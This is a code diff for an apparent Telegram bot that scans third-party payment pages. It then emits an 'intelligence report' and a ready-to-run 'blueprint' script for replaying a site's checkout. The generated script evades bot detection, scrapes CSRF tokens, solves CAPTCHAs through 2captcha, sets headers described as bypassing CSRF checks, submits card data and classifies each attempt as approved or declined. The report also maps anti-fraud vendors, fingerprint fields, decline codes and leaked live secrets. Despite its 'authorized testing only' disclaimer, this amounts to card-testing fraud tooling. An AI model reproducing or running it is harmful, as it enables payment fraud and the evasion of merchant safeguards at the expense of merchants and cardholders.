+            {k: v for k, v in c.items() if v is not None and v != []}
+            for c in auth['cookies']
+        ]
+
+    # Required headers
+    hdrs = data.get('headers', [])
+    req_hdrs = [h for h in hdrs if h.get('status_key') in ('required', 'important')]
+    if req_hdrs:
+        auth['required_headers'] = [
+            {'name': h['header'], 'notes': h.get('notes', '')}
+            for h in req_hdrs
+        ]
+
+    # Resolved token headers
+    hdr_tokens = {
+        info['header_key']: info['value']
+        for info in rt.values()
+        if info.get('header_key') and info.get('value')
+           and info.get('confidence') in ('live', 'static')
+    }
+    if hdr_tokens:
+        auth['token_headers'] = hdr_tokens
+
+    if auth:
+        report['auth_surface'] = auth
+
+    # ── [5] captcha ───────────────────────────────────────────
+    rc = data.get('recaptcha')
+    all_sk: list = []
+    if rc and rc.get('all_keys'):
+        all_sk = rc['all_keys']
+    elif rc and rc.get('site_key'):
+        all_sk = [rc]
+    for sp in data.get('subpage_sitekeys', []):
+        for k in (sp.get('all_keys') or [sp]):
+            if k not in all_sk:
+                all_sk.append(k)
+
+    if all_sk:
+        captcha_out = []
+        for sk in all_sk:
+            ck_type = sk.get('type') or sk.get('captcha_type', 'CAPTCHA')
+            entry_c: dict = {
+                'type':     ck_type,
+                'site_key': sk.get('site_key', ''),
+            }
+            if sk.get('action'):     entry_c['action']   = sk['action']
+            if sk.get('invisible'):  entry_c['invisible'] = True
+            if sk.get('min_score'):  entry_c['min_score'] = sk['min_score']
+            if sk.get('enterprise'): entry_c['enterprise'] = True
+            if sk.get('callback'):   entry_c['callback'] = sk['callback']
+            # Solver hint
+            solver_hint = {
+                'reCAPTCHA v2': '2captcha / anticaptcha / capsolver — type: userrecaptcha',
+                'reCAPTCHA v3': '2captcha — type: userrecaptcha, version: v3',
+                'hCaptcha':     '2captcha / anticaptcha — type: hcaptcha',
+                'Turnstile':    'capsolver / 2captcha — type: turnstile',
+                'FunCaptcha':   '2captcha / anticaptcha — type: funcaptcha',
+            }.get(ck_type, 'Manual solve or 3rd-party service')
+            entry_c['solver_hint'] = solver_hint
+            captcha_out.append(entry_c)
+        report['captcha'] = captcha_out
+
+    # ── [6] network ───────────────────────────────────────────
+    net: dict = {}
+
+    xhr_reqs = (lr.get('requests') or []) if lr else []
+    if xhr_reqs:
+        net['xhr_requests'] = [
+            {
+                'url':          r.get('url', '')[:120],
+                'method':       r.get('method', ''),
+                'content_type': r.get('content_type', '') or None,
+                'post_data':    r.get('post_data', '')[:200] or None,
+            }
+            for r in xhr_reqs[:20]
+        ]
+        net['xhr_requests'] = [
+            {k: v for k, v in r.items() if v}
+            for r in net['xhr_requests']
+        ]
+
+    ws_findings = data.get('ws_payment_findings', [])
+    if ws_findings:
+        net['websocket_payment_signals'] = ws_findings
+
+    if live_finds:
+        net['live_secrets'] = [
+            {k: v for k, v in {
+                'type':       lf.get('type'),
+                'value':      lf.get('value'),
+                'source':     lf.get('source'),
+                'confidence': lf.get('confidence'),
+            }.items() if v}
+            for lf in live_finds[:10]
+        ]
+
+    ct_mm = data.get('content_type_mismatches', [])
+    if ct_mm:
+        net['content_type_mismatches'] = ct_mm
+
+    if net:
+        report['network'] = net
+
+    # ── [7] anti_fraud ────────────────────────────────────────
+    afl = data.get('anti_fraud_layers', [])
+    dfp = data.get('device_fingerprints', [])
+    if afl or dfp:
+        af_out: dict = {}
+        if afl:
+            af_out['layers'] = [
+                {k: v for k, v in {
+                    'vendor':      a.get('vendor') or a.get('name'),
+                    'confidence':  a.get('confidence'),
+                    'risk_impact': a.get('risk_impact'),
+                    'required_fields': [
+                        f.get('name') for f in a.get('fields', []) if f.get('required')
+                    ] or None,
+                    'required_headers': [
+                        h.get('name') for h in a.get('headers', []) if h.get('required')
+                    ] or None,
+                }.items() if v}
+                for a in afl
+            ]
+        if dfp:
+            af_out['device_fingerprints'] = [
+                {k: v for k, v in {
+                    'vendor':     fp.get('vendor') or fp.get('name'),
+                    'field_name': fp.get('field_name'),
+                    'note':       fp.get('note'),
+                }.items() if v}
+                for fp in dfp
+            ]
+        report['anti_fraud'] = af_out
+
+    # ── [8] response_map ─────────────────────────────────────
+    rp = data.get('response_patterns', {})
+    if rp:
+        rm: dict = {'verdict': rp.get('verdict', 'unknown')}
+        if rp.get('success'):
+            rm['success_indicators'] = [
+                {'label': i.get('label'), 'source': i.get('source')}
+                for i in rp['success'][:8]
+            ]
+        if rp.get('decline'):
+            rm['decline_indicators'] = [
+                {k: v for k, v in {
+                    'label':        i.get('label'),
+                    'source':       i.get('source'),
+                    'decline_code': i.get('stripe_decline_code'),
+                    'meaning':      i.get('stripe_meaning'),
+                }.items() if v}
+                for i in rp['decline'][:8]
+            ]
+        if rp.get('response_codes'):
+            rm['iso_8583_codes'] = [
+                {'code': c['code'], 'meaning': c['meaning'], 'verdict': c['verdict']}
+                for c in rp['response_codes']
+            ]
+        if rp.get('stripe_codes'):
+            rm['stripe_decline_codes'] = [
+                {'code': s['code'], 'description': s['description']}
+                for s in rp['stripe_codes']
+            ]
+        report['response_map'] = rm
+
+    # ── [9] sdk_profile ───────────────────────────────────────
+    sdks = data.get('payment_sdks', [])
+    if sdks:
+        report['sdk_profile'] = sdks
+
+    bt = data.get('braintree_hosted')
+    if bt:
+        report.setdefault('sdk_profile', []).append({
+            'name':          'Braintree Hosted Fields',
+            'type':          'hosted_fields',
+            'dom_accessible': False,
+            'note':          bt.get('note', ''),
+        })
+
+    # ── [10] risk_summary ─────────────────────────────────────
+    recs: list = []
+    if _raw_risk:
+        recs.append('Raw card POST detected — card data reaches server unencrypted')
+    if threeds:
+        recs.append('3DS signals present — implement 3DS flow for authentication')
+    if not data.get('auth_cookies'):
+        recs.append('No auth cookies detected — verify session management')
+    cors = data.get('cors_info')
+    if cors and cors.get('issues'):
+        recs += cors['issues'][:2]
+    csp = data.get('csp_info')
+    if csp and csp.get('issues'):
+        recs += csp['issues'][:2]
+
+    report['risk_summary'] = {
+        'risk':         risk,
+        'raw_post':     _raw_risk,
+        'has_3ds':      bool(threeds),
+        'has_captcha':  bool(all_sk),
+        'gateway_count': len(gateways),
+        'form_count':   len(data.get('forms', [])),
+        'xhr_count':    len(data.get('requests', [])),
+        'recommendations': recs if recs else ['No critical issues detected'],
+    }
+
+    safe = _sanitize_for_json(report)
+    return json.dumps(safe, indent=2, ensure_ascii=False)
+
+
+# ══════════════════════════════════════════════════════════════
+# 🆕 BLUEPRINT GENERATOR
+# ══════════════════════════════════════════════════════════════
+
+def _build_blueprint(data: dict) -> str:
+    """
+    Generate a step-by-step technical Blueprint as a structured JSON file.
+
+    The Blueprint translates the scan data into an executable pseudo-code
+    guide for replicating the target's payment flow in a standalone script.
+
+    Structure:
+      meta          — target info, blueprint_version, generated_at
+      prerequisites — libraries, env vars to set
+      steps[]       — ordered steps with code, notes, warnings
+      full_script   — assembled Python script (ready to run)
+    """
+    from datetime import timezone
+
+    url    = data.get('url', '')
+    domain = urlparse(url).hostname or url
+    now    = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')
+
+    gateways = data.get('gateways', [])
+    gw_name  = gateways[0].get('name', 'Unknown') if gateways else 'Unknown'
+    gw_tok   = gateways[0].get('tokenization', '') if gateways else ''
+    is_raw   = any(g.get('raw_post_risk') for g in gateways)
+
+    all_entries     = data.get('forms', []) + data.get('requests', [])
+    resolved_tokens = data.get('resolved_tokens', {})
+    rc              = data.get('recaptcha')
+    threeds         = data.get('threeds_signals', [])
+    token_sources   = data.get('token_sources', [])
+    auth_cookies    = data.get('auth_cookies', [])
+
+    # Derive primary endpoint
+    pay_entry = next(
+        (e for e in all_entries if e.get('is_payment') and e.get('action')), None
+    ) or next((e for e in all_entries if e.get('action')), None)
+
+    endpoint = ''
+    method   = 'POST'
+    enctype  = 'application/x-www-form-urlencoded'
+    if pay_entry:
+        endpoint = pay_entry.get('action') or pay_entry.get('endpoint', '')
+        method   = (pay_entry.get('method') or 'POST').upper()
+        enc      = pay_entry.get('enctype', '')
+        if enc:
+            enctype = enc
+
+    # Collect all fields from payment entry
+    all_fields = pay_entry.get('fields', []) if pay_entry else []
+    card_fields   = [f for f in all_fields if f.get('card_type') in (
+        'Card Number','CVV/CVC','Expiry Month','Expiry Year',
+        'Expiry MM/YY','Cardholder Name')]
+    dyn_fields    = [f for f in all_fields if f.get('is_dynamic')]
+    hidden_fields = [f for f in all_fields if f.get('type') == 'hidden'
+                     and not f.get('is_dynamic')]
+    billing_fields= [f for f in all_fields if f.get('card_type', '') in (
+        'Billing First Name','Billing Last Name','Billing Address',
+        'Billing City','Billing State','Billing Zip','Billing Country',
+        'Billing Company','Amount','Currency','Customer ID')]
+
+    has_captcha = bool(rc and rc.get('site_key'))
+    captcha_type = (rc.get('captcha_type') or rc.get('type', 'reCAPTCHA v2')) if rc else ''
+    sitekey      = rc.get('site_key', '') if rc else ''
+
+    # ── Meta ─────────────────────────────────────────────────
+    bp: dict = {
+        'meta': {
+            'target':            url,
+            'domain':            domain,
+            'gateway':           gw_name,
+            'tokenization':      gw_tok,
+            'raw_post':          is_raw,
+            'blueprint_version': '1.0',
+            'generated_at':      now,
+            'disclaimer':        (
+                'FOR AUTHORIZED SECURITY TESTING ONLY. '
+                'Do not use against systems you do not own or have explicit permission to test.'
+            ),
+        }
+    }
+
+    # ── Prerequisites ─────────────────────────────────────────
+    libs = ['requests']
+    if has_captcha:
+        libs.append('# pip install 2captcha-python  (or capsolver-python)')
+    if gw_name in ('Stripe',):
+        libs.append('# pip install stripe  (optional — SDK alternative)')
+
+    env_vars: dict = {}
+    if has_captcha:
+        env_vars['CAPTCHA_API_KEY'] = '<your_2captcha_or_capsolver_api_key>'
+    if gw_name == 'Stripe':
+        env_vars['STRIPE_PK'] = '<pk_live_or_test_key_from_site>'
+
+    bp['prerequisites'] = {
+        'python':    '3.10+',
+        'libraries': libs,
+        'env_vars':  env_vars if env_vars else None,
+    }
+    bp['prerequisites'] = {k: v for k, v in bp['prerequisites'].items() if v}
+
+    # ── Steps ─────────────────────────────────────────────────
+    steps: list = []
+    step_num = 0
+    code_lines: list = []  # accumulate for full_script
+
+    # ── STEP: Imports + session setup ─────────────────────────
+    step_num += 1
+    import_code = [
+        'import os, re, json, requests',
+        'from urllib.parse import urljoin',
+        '',
+        f"BASE_URL = '{urlparse(url).scheme}://{urlparse(url).netloc}'",
+        f"TARGET   = '{url}'",
+        f"ENDPOINT = '{endpoint or url}'",
+        '',
+        '# Session preserves cookies across requests',
+        's = requests.Session()',
+        's.headers.update({',
+        "    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',",
+        "    'Accept':     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',",
+        "    'Accept-Language': 'en-US,en;q=0.9',",
+        '})',
+    ]
+    steps.append({
+        'step':  step_num,
+        'title': 'Session Setup',
+        'notes': 'Initialize a requests Session to preserve cookies. Set browser-like headers to avoid basic bot detection.',
+        'code':  '\n'.join(import_code),
+    })
+    code_lines += import_code + ['']
+
+    # ── STEP: Fetch page + prime session ──────────────────────
+    step_num += 1
+    prime_code = [
+        '# Fetch the payment page to trigger cookie/session creation',
+        f"page_resp = s.get(TARGET, verify=False, timeout=15)",
+        'page_html = page_resp.text',
+        'print(f"[*] Page fetched — status: {page_resp.status_code}")',
+    ]
+    steps.append({
+        'step':  step_num,
+        'title': 'Fetch Page + Prime Session',
+        'notes': (
+            'GET the target URL to establish a session and receive cookies. '
+            'Server-side CSRF tokens, nonces, and session cookies are issued here.'
+        ),
+        'code':  '\n'.join(prime_code),
+    })
+    code_lines += prime_code + ['']
+
+    # ── STEP: Extract CSRF / dynamic tokens ───────────────────
+    if dyn_fields or token_sources:
+        step_num += 1
+        token_extracts: list = []
+        token_extracts.append('# Extract dynamic tokens from page HTML')
+        token_extracts.append('import re as _re')
+
+        # Use known token sources from scan
+        _added_names: set = set()
+        for ts_entry in token_sources[:6]:
+            tname = ts_entry.get('name', '')
+            if not tname or tname in _added_names:
+                continue
+            _added_names.add(tname)
+            src_type = ts_entry.get('source_type', '')
+            resolved = resolved_tokens.get(tname, {})
+            rval     = resolved.get('value', '')
+
+            if src_type == 'hidden_input':
+                token_extracts.append(
+                    f"m_{tname[:20]} = _re.search("
+                    f"r'name=[\"\\']?{re.escape(tname)}[\"\\']?\\s+value=[\"\\']([^\"\\'>]+)',  page_html)"
+                )
+                token_extracts.append(
+                    f"{tname[:20]} = m_{tname[:20]}.group(1) if m_{tname[:20]} else ''"
+                )
+                if rval:
+                    token_extracts.append(
+                        f"# Scan resolved: '{rval[:40]}' (use as fallback if regex fails)"
+                    )
+            elif src_type == 'meta_tag':
+                token_extracts.append(
+                    f"m_{tname[:20]} = _re.search("
+                    f"r'<meta[^>]+name=[\"\\']?{re.escape(tname)}[\"\\'][^>]+content=[\"\\']([^\"\\'>]+)', page_html)"
+                )
+                token_extracts.append(
+                    f"{tname[:20]} = m_{tname[:20]}.group(1) if m_{tname[:20]} else ''"
+                )
+            elif src_type == 'cookie':
+                token_extracts.append(
+                    f"{tname[:20]} = s.cookies.get('{tname}', '')"
+                )
+            elif src_type == 'js_variable':
+                token_extracts.append(
+                    f"m_{tname[:20]} = _re.search("
+                    f"r'[\"\\']?{re.escape(tname)}[\"\\']?\\s*[:=]\\s*[\"\\']([^\"\\'>]+)', page_html)"
+                )
+                token_extracts.append(
+                    f"{tname[:20]} = m_{tname[:20]}.group(1) if m_{tname[:20]} else ''"
+                )
+            else:
+                token_extracts.append(f"{tname[:20]} = ''  # extract manually")
+
+        # Add header injection for token headers
+        hdr_tokens = {
+            info.get('header_key'): tname
+            for tname, info in resolved_tokens.items()
+            if info.get('header_key') and info.get('confidence') in ('live', 'static')
+        }
+        if hdr_tokens:
+            token_extracts.append('')
+            token_extracts.append('# Inject token headers required by server')
+            for hk, tname in hdr_tokens.items():
+                token_extracts.append(
+                    f"s.headers['{hk}'] = {tname[:20]}"
+                )
+
+        steps.append({
+            'step':  step_num,
+            'title': 'Extract Dynamic Tokens (CSRF / Nonce)',
+            'notes': (
+                'Parse the page HTML to extract CSRF tokens, nonces, or session tokens. '
+                'These must be included in the POST body or headers or the server will reject the request.'
+            ),
+            'code':  '\n'.join(token_extracts),
+        })
+        code_lines += token_extracts + ['']
+
+    # ── STEP: CAPTCHA solve ───────────────────────────────────
+    if has_captcha:
+        step_num += 1
+        cap_code: list = []
+        cap_code.append('# Solve CAPTCHA using a third-party service')
+        cap_code.append('CAPTCHA_API_KEY = os.environ.get("CAPTCHA_API_KEY", "")')
+        cap_code.append('')
+
+        if captcha_type == 'reCAPTCHA v3':
+            action = rc.get('action', 'submit') if rc else 'submit'
+            min_sc = rc.get('min_score', '0.7') if rc else '0.7'
+            cap_code += [
+                f"# reCAPTCHA v3 — site_key: {sitekey[:60]}",
+                f"# action: {action}  |  min_score: {min_sc}",
+                'import urllib.request, urllib.parse, time',
+                'def solve_recaptcha_v3(api_key, sitekey, page_url, action):',
+                '    payload = {',
+                "        'key':     api_key,",
+                "        'method':  'userrecaptcha',",
+                "        'version': 'v3',",
+                f"        'action':  '{action}',",
+                "        'googlekey': sitekey,",
+                "        'pageurl': page_url,",
+                "        'json':    1,",
+                '    }',
+                "    r = urllib.request.urlopen('http://2captcha.com/in.php', "
+                "urllib.parse.urlencode(payload).encode())",
+                '    task_id = json.loads(r.read())["request"]',
+                '    for _ in range(30):',
+                '        time.sleep(5)',
+                "        res = urllib.request.urlopen(",
+                f"            f'http://2captcha.com/res.php?key={{api_key}}&action=get&id={{task_id}}&json=1')",
+                '        data = json.loads(res.read())',
+                "        if data.get('status') == 1:",
+                "            return data['request']",
+                '    return ""',
+                '',
+                f"recaptcha_token = solve_recaptcha_v3(",
+                f"    CAPTCHA_API_KEY, '{sitekey[:60]}', TARGET, '{action}')",
+                'print(f"[*] reCAPTCHA v3 token: {recaptcha_token[:30]}...")',
+            ]
+        elif captcha_type == 'hCaptcha':
+            cap_code += [
+                f"# hCaptcha — site_key: {sitekey[:60]}",
+                'import urllib.request, urllib.parse, time',
+                'def solve_hcaptcha(api_key, sitekey, page_url):',
+                '    payload = {',
+                "        'key':       api_key,",
+                "        'method':    'hcaptcha',",
+                "        'sitekey':   sitekey,",
+                "        'pageurl':   page_url,",
+                "        'json':      1,",
+                '    }',
+                "    r = urllib.request.urlopen('http://2captcha.com/in.php', "
+                "urllib.parse.urlencode(payload).encode())",
+                '    task_id = json.loads(r.read())["request"]',
+                '    for _ in range(30):',
+                '        time.sleep(5)',
+                "        res = urllib.request.urlopen(",
+                "            f'http://2captcha.com/res.php?key={api_key}&action=get&id={task_id}&json=1')",
+                '        data = json.loads(res.read())',
+                "        if data.get('status') == 1: return data['request']",
+                '    return ""',
+                '',
+                f"recaptcha_token = solve_hcaptcha(CAPTCHA_API_KEY, '{sitekey[:60]}', TARGET)",
+                'print(f"[*] hCaptcha token: {recaptcha_token[:30]}...")',
+            ]
+        else:
+            cap_code += [
+                f"# {captcha_type or 'CAPTCHA'} — site_key: {sitekey[:60]}",
+                '# Use your preferred solver service — see solver_hint in intelligence report',
+                f"recaptcha_token = ''  # TODO: solve {captcha_type}",
+            ]
+
+        steps.append({
+            'step':    step_num,
+            'title':   f'Solve CAPTCHA ({captcha_type})',
+            'notes':   (
+                f'A {captcha_type} with site_key {sitekey[:40]}... must be solved before the POST. '
+                'Use a third-party solving service (2captcha, capsolver, anticaptcha). '
+                'The token has a short TTL (~120s) — solve immediately before submitting.'
+            ),
+            'warning': 'Token expires in ~120 seconds — solve immediately before POST.',
+            'code':    '\n'.join(cap_code),
+        })
+        code_lines += cap_code + ['']
+
+    # ── STEP: Build POST body ─────────────────────────────────
+    step_num += 1
+    body_lines: list = []
+    body_lines.append('# Build the POST body')
+    body_lines.append('payload = {')
+
+    # Static fields first (from hidden fields with values)
+    for f in hidden_fields:
+        nm  = f.get('name', '')
+        val = f.get('value', '')
+        if nm and val and val not in ('', '0', '0.00'):
+            body_lines.append(f"    '{nm}': '{val}',")
+
+    # Static config fields (non-card, non-dynamic, prefilled values)
+    for f in all_fields:
+        nm  = f.get('name', '')
+        ft  = f.get('type', 'text')
+        val = f.get('value', '')
+        if (nm and val and val not in ('', '0', '0.00')
+                and not f.get('is_dynamic') and not f.get('is_card')
+                and ft not in ('submit', 'button', 'reset', 'hidden', 'iframe')):
+            body_lines.append(f"    '{nm}': '{val[:60]}',")
+
+    # Dynamic token fields
+    body_lines.append('')
+    body_lines.append('    # ── Dynamic tokens (fetched above) ──')
+    _added_tok: set = set()
+    for f in dyn_fields:
+        nm = f.get('name', '')
+        if nm and nm not in _added_tok:
+            _added_tok.add(nm)
+            vname = nm[:20].replace('-', '_').replace('.', '_')
+            body_lines.append(f"    '{nm}': {vname},")
+    if has_captcha:
+        rc_field = next(
+            (f.get('name') for f in all_fields
+             if re.search(r'recaptcha|g-recaptcha', f.get('name', ''), re.I)),
+            'g-recaptcha-response'
+        )
+        body_lines.append(f"    '{rc_field}': recaptcha_token,")
+
+    # Card fields
+    if card_fields:
+        body_lines.append('')
+        body_lines.append('    # ── Card data (fill in) ──')
+        _CF_DEFAULTS = {
+            'Card Number':    '4111111111111111',
+            'CVV/CVC':        '123',
+            'Expiry Month':   '12',
+            'Expiry Year':    '2029',
+            'Expiry MM/YY':   '12/29',
+            'Cardholder Name': 'John Doe',
+        }
+        for f in card_fields:
+            nm = f.get('name', '')
+            ct = f.get('card_type', '')
+            default = _CF_DEFAULTS.get(ct, f'<{nm}>')
+            body_lines.append(f"    '{nm}': '{default}',  # {ct}")
+
+    # Billing / user fields
+    if billing_fields:
+        body_lines.append('')
+        body_lines.append('    # ── Billing fields (fill in) ──')
+        for f in billing_fields:
+            nm  = f.get('name', '')
+            ct  = f.get('card_type', '')
+            ph  = f.get('placeholder') or f'<{nm}>'
+            body_lines.append(f"    '{nm}': '{ph}',  # {ct}")
+
+    body_lines.append('}')
+
+    steps.append({
+        'step':  step_num,
+        'title': 'Build POST Body',
+        'notes': (
+            'Assemble the complete POST body. '
+            'Static values are pre-filled from scan. '
+            'Dynamic token fields must be populated with values extracted in Step 3. '
+            'Card and billing fields require real or test data.'
+        ),
+        'code':  '\n'.join(body_lines),
+    })
+    code_lines += body_lines + ['']
+
+    # ── STEP: Set Content-Type header ─────────────────────────
+    step_num += 1
+    ct_is_json  = 'json' in enctype.lower()
+    ct_code: list = []
+    if ct_is_json:
+        ct_code += [
+            "# Server expects JSON body",
+            "s.headers['Content-Type'] = 'application/json'",
+            "send_payload = json.dumps(payload)",
+        ]
+        send_kwarg = 'data=send_payload'
+    else:
+        ct_code += [
+            "# Server expects URL-encoded form body",
+            "s.headers['Content-Type'] = 'application/x-www-form-urlencoded'",
+            "send_payload = payload",
+        ]
+        send_kwarg = 'data=send_payload'
+
+    referer = url
+    ct_code += [
+        f"s.headers['Referer'] = '{referer}'",
+        f"s.headers['Origin']  = '{urlparse(url).scheme}://{urlparse(url).netloc}'",
+    ]
+
+    steps.append({
+        'step':  step_num,
+        'title': 'Set Request Headers',
+        'notes': f'Content-Type must be {"application/json" if ct_is_json else "application/x-www-form-urlencoded"} as detected from the scan. Referer and Origin headers help bypass basic CSRF checks.',
+        'code':  '\n'.join(ct_code),
+    })
+    code_lines += ct_code + ['']
+
+    # ── STEP: Submit POST ─────────────────────────────────────
+    step_num += 1
+    submit_code = [
+        f"# Submit to endpoint: {endpoint or url}",
+        f"resp = s.{method.lower()}(",
+        f"    ENDPOINT,",
+        f"    {send_kwarg},",
+        "    verify=False,",
+        "    timeout=30,",
+        "    allow_redirects=True,",
+        ")",
+        'print(f"[*] Status: {resp.status_code}")',
+        'print(f"[*] Response: {resp.text[:500]}")',
+    ]
+    steps.append({
+        'step':  step_num,
+        'title': f'Submit POST to Endpoint',
+        'notes': f'Send the assembled payload to {endpoint or url}. allow_redirects=True follows any 3DS or success redirect automatically.',
+        'code':  '\n'.join(submit_code),
+    })
+    code_lines += submit_code + ['']
+
+    # ── STEP: Parse response ──────────────────────────────────
+    step_num += 1
+    rp       = data.get('response_patterns', {})
+    succ_ex  = rp.get('success', [{}])[0] if rp.get('success') else {}
+    decl_ex  = rp.get('decline', [{}])[0] if rp.get('decline') else {}
+
+    parse_code = [
+        '# Parse the response to determine success or decline',
+        'try:',
+        '    resp_json = resp.json()',
+        'except Exception:',
+        '    resp_json = {}',
+        '',
+        '# ── Success detection ──',
+    ]
+    if succ_ex.get('label'):
+        parse_code.append(f"# Detected success pattern: {succ_ex['label']}")
+    parse_code += [
+        "success_signals = ['success', 'succeeded', 'approved', 'completed', 'paid']",
+        "resp_lower = resp.text.lower()",
+        "if any(sig in resp_lower for sig in success_signals):",
+        "    print('[+] PAYMENT APPROVED')",
+        'elif resp_json.get("status") in ("succeeded", "approved", "COMPLETED"):',
+        '    print("[+] PAYMENT APPROVED (JSON status)")',
+        '',
+        '# ── Decline detection ──',
+    ]
+    if decl_ex.get('label'):
+        parse_code.append(f"# Detected decline pattern: {decl_ex['label']}")
+    parse_code += [
+        "decline_signals = ['declined', 'failed', 'rejected', 'error', 'do not honor']",
+        "if any(sig in resp_lower for sig in decline_signals):",
+        "    print('[-] PAYMENT DECLINED')",
+        "    decline_code = resp_json.get('decline_code', resp_json.get('code', ''))",
+        "    if decline_code:",
+        "        print(f'    Code: {decline_code}')",
+    ]
+
+    # Add ISO 8583 code check if found
+    if rp.get('response_codes'):
+        parse_code += [
+            '',
+            '# ── ISO 8583 response code ──',
+            "resp_code_m = __import__('re').search(",
+            '    r\'\"(?:responseCode|response_code)\"\\s*:\\s*"?(\\d{2,3})"?\', resp.text)',
+            'if resp_code_m:',
+            '    print(f"    ISO 8583 code: {resp_code_m.group(1)}")',
+        ]
+
+    steps.append({
+        'step':  step_num,
+        'title': 'Parse Response',
+        'notes': 'Check response body for success/decline keywords and JSON status fields. Response patterns were detected during the scan — see response_map in the intelligence report.',
+        'code':  '\n'.join(parse_code),
+    })
+    code_lines += parse_code + ['']
+
+    # ── STEP: 3DS handling (conditional) ─────────────────────
+    if threeds:
+        step_num += 1
+        _3ds_code = [
+            '# 3DS signals detected — the server may return a redirect or challenge URL',
+            '# Check for ACS URL / PaReq in response',
+            "acs_url = resp_json.get('acsUrl', resp_json.get('acs_url', ''))",
+            "pa_req  = resp_json.get('paReq',  resp_json.get('pa_req',  ''))",
+            "md      = resp_json.get('MD',     resp_json.get('md',      ''))",
+            '',
+            'if acs_url:',
+            "    print(f'[!] 3DS Challenge required → {acs_url}')",
+            "    print('[!] Browser interaction needed to complete 3DS — automate with Playwright/Selenium')",
+            '    # Submit PaReq to ACS URL:',
+            "    # s.post(acs_url, data={'PaReq': pa_req, 'MD': md, 'TermUrl': ENDPOINT})",
+            'else:',
+            "    print('[*] No 3DS redirect detected in response')",
+        ]
+        steps.append({
+            'step':    step_num,
+            'title':   '3DS / SCA Handling',
+            'notes':   '3DS signals were detected on this site. If the POST returns an ACS URL, card authentication is required. Full automation requires a headless browser.',
+            'warning': '3DS requires browser interaction — full automation needs Playwright or Selenium.',
+            'code':    '\n'.join(_3ds_code),
+        })
+        code_lines += _3ds_code + ['']
+
+    bp['steps'] = steps
+
+    # ── Full script ───────────────────────────────────────────
+    header = [
+        '#!/usr/bin/env python3',
+        f'# Blueprint: {domain}',
+        f'# Gateway: {gw_name}  |  Generated: {now}',
+        '# FOR AUTHORIZED SECURITY TESTING ONLY',
+        '# ━' * 36,
+        '',
+    ]
+    bp['full_script'] = '\n'.join(header + code_lines)
+
+    safe = _sanitize_for_json(bp)
     return json.dumps(safe, indent=2, ensure_ascii=False)
 
 
@@ -33791,6 +35307,51 @@ async def cmd_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         except Exception:
             pass
+
+    # ── Intelligence Report export ─────────────────────────────
+    try:
+        intel_str  = _build_intelligence_report(data)
+        intel_name = f"intel_{re.sub(r'[^\\w\\-]', '_', domain)[:36]}.json"
+        intel_tmp  = os.path.join(tempfile.gettempdir(), intel_name)
+        with open(intel_tmp, 'w', encoding='utf-8') as f:
+            f.write(intel_str)
+        with open(intel_tmp, 'rb') as f:
+            await update.effective_message.reply_document(
+                document=f,
+                filename=intel_name,
+                caption=(
+                    f"🔍 *Intelligence Report — `{escape_md(domain)}`*\n"
+                    f"Endpoints · Parameters · Auth Surface · Risk Summary"
+                ),
+                parse_mode='Markdown'
+            )
+        os.unlink(intel_tmp)
+    except Exception as e:
+        logger.warning(f"intelligence report export error: {e}")
+
+    # ── Blueprint export ───────────────────────────────────────
+    try:
+        bp_str  = _build_blueprint(data)
+        bp_name = f"blueprint_{re.sub(r'[^\\w\\-]', '_', domain)[:34]}.json"
+        bp_tmp  = os.path.join(tempfile.gettempdir(), bp_name)
+        with open(bp_tmp, 'w', encoding='utf-8') as f:
+            f.write(bp_str)
+        with open(bp_tmp, 'rb') as f:
+            gw_name = data['gateways'][0]['name'] if data.get('gateways') else '—'
+            await update.effective_message.reply_document(
+                document=f,
+                filename=bp_name,
+                caption=(
+                    f"🗺️ *Blueprint — `{escape_md(domain)}`*\n"
+                    f"Gateway: `{escape_md(gw_name)}` · "
+                    f"Steps: `{len(data.get('forms', []))  + (1 if data.get('recaptcha') else 0) + 4}`\n"
+                    f"_Standalone Python script included_"
+                ),
+                parse_mode='Markdown'
+            )
+        os.unlink(bp_tmp)
+    except Exception as e:
+        logger.warning(f"blueprint export error: {e}")
 
 
 # ══════════════════════════════════════════════════════════════
